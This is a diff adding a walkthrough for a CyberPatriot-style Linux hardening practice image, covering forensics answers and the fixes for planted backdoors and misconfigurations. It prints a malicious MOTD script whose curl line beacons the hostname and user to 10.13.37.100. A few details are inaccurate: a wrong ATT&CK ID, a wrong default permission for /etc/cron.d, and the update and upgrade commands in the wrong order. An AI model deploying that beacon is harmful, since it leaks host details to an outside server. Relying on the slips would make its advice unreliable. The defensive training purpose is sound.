@@ -40,6 +40,9 @@ jlee/.bash_history:curl -s http://localhost/api/admin/export -H "Authorization: 
 **Please keep in mind that the JWT token was partially cut, and so you would have to examine jlee's .bash_history for the full JWT.**
 Using an LLM such as GPT or Gemini and prompting them to determine the expiration date, we find out that the expiration date is `January 1st, 2030`, or `2030-01-01`
 * There are also other tools to decode JWT tokens, and so you do not necessarily need to rely on an LLM.
+* [CyberChef](https://gchq.github.io/CyberChef/)
+* [jwt.io](https://jwt.io)
+* [jwt.ms](https://jwt.ms)
 ***
 ### Forensics Question #2:
 ```
@@ -256,3 +259,309 @@ index 3ce4896..0000000
 ```
 Hence, we know that the leaked Discord token was: `MTk4NzY1NDMyMTAxMjM0NTY3OA.Xk9Lpz.secrettoken123abc`
 ## Vulnerabilities:
+### Removed unauthorized user vex (T1136.001) – Hint: Check vex’s crontab, database privileges, and SSH keys – 3 pts
+From the scenario, we know that `vex` is an attacker on our system. We can also stumble upon her user entry on this system in `/etc/passwd`
+```
+vex:x:1005:1005:Vex Systems:/home/vex:/bin/bash
+```
+After deleting the storyline's attacker, we earn points by minimizing the machine's attack surface.
+### Removed unauthorized user “testacct” (T1136.001) – 3 pts
+After analyzing `/etc/passwd` to conduct user-auditing, we stumble upon this entry:
+```
+testacct:x:1006:1006:QA Testing:/home/testacct:/bin/bash
+```
+Test accounts should not be on a production server, and this account was also not specified as authorized by the README. Hence, deleting it earns us points.
+### Removed hidden backdoor user “..” (T1564.002) – Hint: Look for other hidden files – try ls -la in /etc/cron.d – 5 pts
+It is a common tactic to represent users as paths, such as `..` to trick you and maintain backdoor access. After analyzing `/etc/passwd`, you can see this entry:
+```
+..:x:1007:1007::/home/..:/bin/bash
+```
+After deleting this entry, you earn points for minimizing the attack vector on the machine.
+### Service account “mysql” has no login shell (T1078.003) – 4 pts
+Service accounts in `/etc/passwd` should not have a login shell, as it poses a threat if users gain unauthorized access to the server account. After viewing `/etc/passwd`, we can see this entry:
+```
+mysql:x:994:984:MySQL Server:/home/mysql:/bin/bash
+```
+After setting the `/bin/bash` to `/usr/sbin/nologin`, we earn points for reducing the attack surface on our machine.
+### Removed UID 0 backdoor user specter (T1136.001) – Hint: Compare /etc/passwd against the authorized user list carefully – 5 pts
+Unless explicitly stated by the README, no user should have the GID and UID of root except root! After examining carefully `/etc/passwd`, we stumble upon this entry:
+```
+specter:x:0:0:Specter Admin:/root:/bin/bash
+```
+Hence, deleting this unauthorized user further minimizes the attack vector on the workstation.
+### Disabled SSH root login (T1021.004) – Hint: Check authorized_keys files for attacker SSH keys – 4 pts
+Disabling SSH root login is a very important security measure, as attackers must attempt to guess or find a username and a password instead of blindly attempting logins in as root.
+```
+$ sudo vim /etc/ssh/sshd_config
+PermitRootLogin no
+```
+### Disabled SSH empty passwords (T1020.003) – 4 pts
+Disabling the usage of empty passwords enforces users to utilize credentials. Weakened authentication is often exploited by attackers to compromise systems.
+```
+$ sudo vim /etc/ssh/sshd_config
+PermitEmptyPasswords no
+```
+### Removed attacker SSH key from root authorized_keys (T1098.004) – Hint: The attacker IP subnet may have firewall rules – 5 pts
+SSH authorized keys allow for users to connect without passwords to user accounts. If an attacker were to add their own public key, they would be able to establish a persistance access mechanism without requiring credentials. To find all `.ssh/` directories, we can run the following **find** command:
+```
+$ sudo find / -type d -name ".ssh" 2>/dev/null
+/root/.ssh
+/home/mford/.ssh
+/home/jlee/.ssh
+```
+After investigating the contents of `/root/.ssh/authorized_keys`, we can see that the attacker planted their own:
+```
+root@botforge:~/.ssh# cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3xKmJV8KzE9bAVnbHT2tG7dKNzqLRJLJPvUhKPS9LNJhT0LMxKpNS8HX7qKdZqzNVnPKC7Y4VqPdC8sKmNVS9LxKJP7qDnT2FcC9bAVnHdKzE9bAVnbHT2t== vex@laptop
+```
+After deleting this this key from the file, we have effectively removed their persistant access to the SSH server.
+### Removed backdoor SSH listener on port 2222 (T1571) – 3 pts
+Upon examining `/etc/ssh/sshd_config`, you can notice that there are two entries for SSHD ports: `22`, and `2222`. If not explicitly stated by the README, the non-standard port `2222` should be deleted to minimize the attack surface for attackers.
+```bash
+$ sudo vim /etc/ssh/sshd_config
+Port 22
+--->Port 2222<---
+```
+### Disabled IP forwarding (T1599) – Network Boundary Bridging – 4 pts
+IP forwarding is a mechanism to route packets between different interfaces, consistently exploited by attackers to relay traffic. This should be disabled to minimize risk.
+```
+$ sudo vim /etc/sysctl.conf
+net.ipv4.ip_forward = 0
+```
+To load the new parameters, run `sysctl -p`
+### Disabled core dumps or secured dump locations (T1003.007) – 4 pts
+Core dumps are the memory contents of a process when a crash occurs. They can contain critical information in insecure environments, such as credentials in a world-readable directory, meaning they should be disabled to minimize risk.
+```
+$ sudo vim /etc/sysctl.conf
+fs.suid_dumpable = 0
+```
+To load the new parameters, run `sysctl -p`
+### Enabled UFW firewall (CIS 9.2) – Hint: Review the rules – attackers sometimes add allow rules for their IPs – 4 pts
+UFW, or Uncomplicated Firewall, is the most common firewall utilized in CyberPatriots. A firewall blocks unauthorized network requests from communicating with your system, reducing the amount of attack vectors on your system.
+```bash
+$ sudo apt install ufw
+$ sudo ufw enable
+```
+Furthermore, although not scored in this image, it is always good to have default rules and close open ports:
+```bash
+$ sudo ufw default deny incoming
+$ sudo ufw default deny routed
+$ sudo ufw default allow outgoing
+```
+And additionally, you want to allow specific packets to leave your computer (including critical services).
+```bash
+$ sudo ufw allow https
+$ sudo ufw allow http
+$ sudo ufw allow git
+$ sudo ufw allow ssh
+...
+```
+### Removed attacker UFW allow rule for 203.0.113.0/24 (T1562.004) – Hint: This matches the brute force IP from Forensic Q3 – 4 pts
+It is common for attackers to include insecure firewall rules to have continous access to the machine indefinitely. It is good practice to audit all UFW rules on the system!
+```
+$ sudo ufw status
+To                         Action      From
+--                         ------      ----
+Anywhere                   ALLOW       203.0.113.0/24            
+443                        ALLOW       Anywhere                  
+80/tcp                     ALLOW       Anywhere                  
+9418/tcp                   ALLOW       Anywhere                  
+443 (v6)                   ALLOW       Anywhere (v6)             
+80/tcp (v6)                ALLOW       Anywhere (v6)             
+9418/tcp (v6)              ALLOW       Anywhere (v6)
+```
+As you can see, there is a very suspicious rule, specifically `203.0.113.0/24`
+* The attacker can connect to any port or service through the IP address 203.0.113.0
+To delete the malicious rule, you simply delete it using the index:
+```
+$ sudo ufw delete 1
+Deleting:
+ allow from 203.0.113.0/24
+Proceed with operation (y|n)? y
+Rule deleted
+```
+### Disabled telnet via xinetd (T1021.002) – 4 pts
+Telnet is a service that provides terminal access, and is inherently insecure in itself. It can be abused by remote attackers to gain access and compromise the system.
+* For context, xinetd is typically misconfigured and expands the attack surface, which is why I also prefer deleting it as well.
+This vulnerability can automatically be caught through baselining or automation, as `xinetd` is not typically installed on the system, and is often removed.
+```bash
+$ sudo apt purge xinetd telnetd telnet
+$ sudo rm -rf /etc/xinetd.d/
+```
+Hence, after deleting `xinetd` (a non-critical service) and `telnetd` (an additional non-critical service), we gain points!
+### Secured Redis – bound to localhost or requires auth or disabled (T1021.002) – Remote Services – 4 pts
+There were many ways to find out that the non-critical service `redis` was installed:
+* You could have stumbled upon its entry in `/etc/passwd`
+* You could have stunbled upon its service by running `systemctl --type=service`
+Regardless, if a service is not explicitly stated as critical by the README, chances are you should delete it.
+* Furthermore, any remote services pose an increased risk to the attack vector of the system.
+```
+$ sudo systemctl disable --now redis
+$ sudo apt purge redis-server redis-tools
+```
+### Stopped or removed vsftpd service (T1071.002) – File Transfer – 2 pts
+There were many ways to find out that the non-critical service `vsftpd` was installed:
+* You could have stumbled upon its file `/etc/vsftpd.conf`
+* You could have stunbled upon its service by running `systemctl --type=service`
+Regardless, if a service is not explicitly stated as critical by the README, chances are you should delete it.
+* Furthermore, any remote services pose an increased risk to the attack vector of the system.
+```
+$ sudo systemctl disable --now vsftpd
+$ sudo apt purge vsftpd
+```
+### Nginx running as non-root user (T1078.003) – Local Accounts – 5 pts
+It is common for many HTTP-related services like NGINX or Apache to be ran through the user www-data, an isolated service user with separate permissions. This isolates it from having administrative permissions that could be compromised and exploited for further access. After examining /etc/nginx.conf, we see these contents:
+```bash
+user root;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+```
+After changing `user root` to `user www-data`, we earn points by separating privileges and minimizing the attack vector.
+### Removed backup config from webroot (T1552.001 – Credentials in Files) – 3 pts
+After running `ls -la` in `/var/www/dashboard/`, we are able to view all files in the directory, including hidden ones:
+```
+root@botforge:/var/www/dashboard# ls -la
+total 40
+drwxr-xr-x 5 www-data www-data 4096 Jan 19 13:50 .
+drwxr-xr-x 4 root     root     4096 Dec 30 00:30 ..
+-rwxr-xr-x 1 www-data www-data  205 Dec 30 00:30 .env
+drwxr-xr-x 2 www-data www-data 4096 Jan 19 03:18 includes
+-rwxr-xr-x 1 www-data www-data 6241 Dec 30 00:32 index.php
+-rwxr-xr-x 1 www-data www-data  469 Dec 30 00:30 .nginx.conf.bak
+drwxr-xr-x 2 www-data www-data 4096 Dec 30 00:30 static
+-rwxr-xr-x 1 www-data www-data  734 Dec 30 00:32 status.php
+drwxr-xr-x 2 www-data www-data 4096 Jan 19 03:18 uploads
+```
+There are two major vulnerabilities that we can see:
+* We have `.nginx.conf.bak`, a backup of our `NGINX` configuration that can be exploited for reconnaissance.
+* We have `.env` **containing important credentials** easily located in a **production environment!**
+For this vulnerability, after removing the `.nginx.conf.bak` file, we gain points for minimizing the attack surface.
+### Enabled Nginx access logging (T1070.002 – Clear Linux or Mac System Logs) – 2 pts
+### Disabled Nginx server version disclosure (T1082 – System Information Discovery) – 3 pts
+### Disabled insecure TLS versions in Nginx (T1557 – Adversary-in-the-Middle) – 3 pts
+### Disabled allow_url_include (T1105 – Ingress Tool Transfer) – 4 pts
+### Revoked database privileges from terminated user vex (T1078.003) – 3 pts
+### Removed remote root login for MariaDB (T1021 – Remote Services) – 4 pts
+### MariaDB bound to localhost only (T1021 – Remote Services) – 4 pts
+### Removed privileged docker group (T1611) – Hint: Docker group = root equivalent. Check docker-compose.yml for container escapes – 4 pts
+### Removed privileged flag from containers (T1611) – Hint: Check for other dangerous Docker settings: socket mounts, capabilities – 5 pts
+### Removed Docker socket mount from containers (T1611) – 5 pts
+### Removed SFTP ADMIN capability from containers (T1611) – 4 pts
+### Removed untrusted registry “vexregistry.io” from Docker config (T1195.002) – 3 pts
+### Removed netcat backdoor from /etc/crontab (T1053.003) – Hint: Check user crontabs too with ‘crontab -l -u <user>’ – 5 pts
+### Removed vex user crontab with reverse shell (T1053.003) – Hint: Look for hidden cron files in /etc/cron.d – 5 pts
+### Removed malicious systemd service “system-update” (T1543.002) – Hint: Check for SUID binaries: find / -perm -4000 – 5 pts
+### Removed SUID backdoor /usr/local/bin/healthcheck (T1548.001) – Hint: Check /etc/ld.so.preload for library injection – 5 pts
+### Removed malicious ld.so.preload entry (T1547.006) – 5 pts
+### Removed malicious MOTD script (T1546.004) – Hint: Check /etc/polkit-1/rules.d/ for privilege escalation rules – 5 pts
+The directory `/etc/update-motd.d/` is notorious for being abused and having established persistance mechanisms. Upon inspection of the files in this directory, the file `/etc/update-motd.d/99-sysinfo` has malware.
+```bash
+#!/bin/bash
+echo "System Status: $(uptime -p)"
+curl -s "http://10.13.37.100/beacon?h=$(hostname)&u=$(whoami)" &>/dev/null &
+```
+After removing this mechanism, we earn points.
+* In detail, it sends an HTTP request to 10.13.37.100/beacon with details about our hostname and the current user.
+### Removed polkit rule granting joe passwordless root (T1548.003) – 5 pts
+PolicyKit controls authorization for escalated-privilege actions. Custom persistant rules can be established and abused, granting users root without credentials.
+* By investigating `/etc/polkit-1/rules.d/`, you learn of the existance of `/etc/polkit-1/rules.d/49-botforge.rules`
+```javascript
+polkit.addRule(function(action, subject) {
+    if (subject.user == "jlee") {
+        return polkit.Result.YES;
+    }
+});
+```
+After removing this careless rule, you minimize the risks of privilege escalation on your system.
+### Removed hidden cron job /etc/cron.d/maintenance (T1053.003) – 4 pts
+In general, when investigating directories, you should always use the `ls -la` command, which also reveals any hidden files. Subsequent to running `ls -la` in `/etc/cron.d/`, a suspicious hidden file `.maintenance` is revealed:
+```bash
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/30 * * * * root /usr/local/bin/healthcheck --quiet 2>/dev/null
+```
+This file also reveals to us malware at `/usr/local/bin/healthcheck`, which should be investigated prior removing the cronjob.
+* `/usr/local/bin/healthcheck` is a compiled binary, meaning you could use `strings` to examine it further.
+Removing `/usr/local/bin/healthcheck` and `/etc/cron.d/.maintenance` remove the malicious persistance mechanism.
+### Removed hydra password cracker (T1110) – Hint: This was likely used for SSH brute attack – 3 pts
+It is very difficult to find malware on any system, which is why people go through two routes to simplify the process:
+* The most intuitive: Baseline a clean Linux Mint 22, and compare it to this version.
+* Time consuming: Automate the process of purging malicious malware through scripts.
+Personally, I have used the second option, personally skimming every single Kali Linux penetration tool, and purging them if they exist on the system.
+```
+$ sudo apt purge hydra
+```
+### Removed nmap network scanner (T1046) – Hint: Check attacker artifacts in jlee's hidden directories – 3 pts
+Similarly to the aforementioned vulnerability, either baselining or automation would have caught this non-standard installed package.
+```
+$ sudo apt purge nmap
+```
+### Removed netcat-traditional via apt (T1059.004) – Hint: This enables the reverse shells in crontabs – 3 pts
+This is a package that should generally be deleted unless it interferes with certain dependencies (like ftp with ubuntu-standard). However, due to the malicious nature of this image, and the regarding the fact that this package was exploited through crontabs, means it would be wise to uninstall it.
+```
+$ sudo apt purge netcat-traditional
+```
+### Fixed /etc/shadow permissions (T1003.003/004) – 3 pts
+When performing an image, you should always check the permissions of very important files and directories, such as `/etc/shadow` and `/etc/passwd`
+* Examining the permissions of /etc/shadow, we can see that the permissions are definitely insecure:
+```
+mford@botforge:~$ sudo ls -la /etc/shadow
+-rw-r--r-- 1 root shadow 2251 Dec 30 00:30 /etc/shadow
+```
+The last `r` means that anyone that is not root or in the shadow group can read from a file containing **password hashes!**
+* To remediate this, run `chmod 640 /etc/shadow`
+### Fixed /etc/cron.d permissions – not world-writable (T1053.003 – Cron Modification) – 3 pts
+This vulnerability was easy to stumble upon if you ran `ls -la` in /etc/cron.d while investigating for insecure permissions and files.
+```
+mford@botforge:/etc/cron.d$ ls -la
+total 44
+drwxrwxrwx   2 root root  4096 Jan 19 11:48 .
+drwxr-xr-x 160 root root 12288 Jan 19 12:00 ..
+-rw-r--r--   1 root root   219 Nov 17  2023 anacron
+-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
+-rw-r--r--   1 root root   148 Nov 20  2024 .maintenance
+-rw-r--r--   1 root root   712 Jan 18  2024 php
+-rw-r--r--   1 root root   102 Mar 30  2024 .placeholder
+-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
+-rw-r--r--   1 root root   377 Apr 18  2024 zfsutils-linux
+```
+The `.` entry represents /etc/cron.d/, and it tells us that anyone can read, write, or execute any file in this directory.
+* To remediate this, set /etc/cron.d/ to its default permission: `chmod 751 /etc/cron.d/`
+### Removed secrets from webroot .env file (T1552.001 - Credentials in Files) - 3 pts
+After stumbling upon the `.env` file in `/var/www/dashboard/`, the most wisest path of action is to move it and isolate it in a different directory.
+* This prevents attackers from potentially compromising our important credentials, secrets, and keys.
+In this practice image, I simply moved it to `/root/.env` and a more secure location can be chosen later.
+```
+$ sudo mv .env /root/.env
+```
+Hence, we gain points for eliminating a really important vulnerability.
+### Fixed tmpfiles.d config /tmp bash sticky bit (T1222 – File Permission Modification) – 3 pts
+### Removed execution from /tmp on srv.log (T1222 – File Permissions) – 3 pts
+### Cleared credentials from root bash history (T1552.003 – Bash History) – 3 pts
+Following Forensics Question 1, it was a hint to us that the .bash_history files can contain vital information. Applying this observation to other accounts such as `root`, you come to find that there are credentials that if leaked, pose an immediate security risk. Hence, by clearing out `/root/.bash_history`, you significantly minimize risk.
+```
+ln -sf /dev/null .bash_history
+```
+* This ensures that any recorded actions of `root` are immediately nulled.
+### Removed Docker registry credentials from config (T1552.001 – Credentials in Files) – 3 pts
+### Removed NOPASSWD from mford sudoers entry (T1548.003 – Sudo) – 3 pts
+After investigating `/etc/sudoers.d/`, there were many suspicious files. One such file was `mford`, which allowed user `mford` to escalate privileges without a password.
+* To remediate this vulnerability, simply delete the file: `rm /etc/sudoers.d/mford`
+### Removed overly permissive botrunner sudo access (T1548.003 – Sudo) – 3 pts
+After investigating `/etc/sudoers.d/`, there were many suspicious files. One such file was `botforge`, which allowed users `botrunner` and `webhook` to escalate privileges without passwords.
+* To remediate this vulnerability, simply delete the file: `rm /etc/sudoers.d/botforge`
+### System packages updated (CIS 7.1 – Mitigates T1190, T1203) – 3 pts
+Updating your packages is important to maintain security updates for the applications and services running on your machine.
+* This significantly reduces risks of attack vectors, ensuring your workstation is safer overall.
+```bash
+$ sudo apt upgrade
+$ sudo apt update
+```
+### Enabled automatic security updates – 3 pts
+Enabling automatic security updates ensure the system receives important updates continously that patch recognized vulnerabilities, thus reducing the attack vector and minimizing risk.
+```
+$ sudo apt install unattended-upgrades
+$ sudo dpkg-reconfigure unattended-upgrades
+```
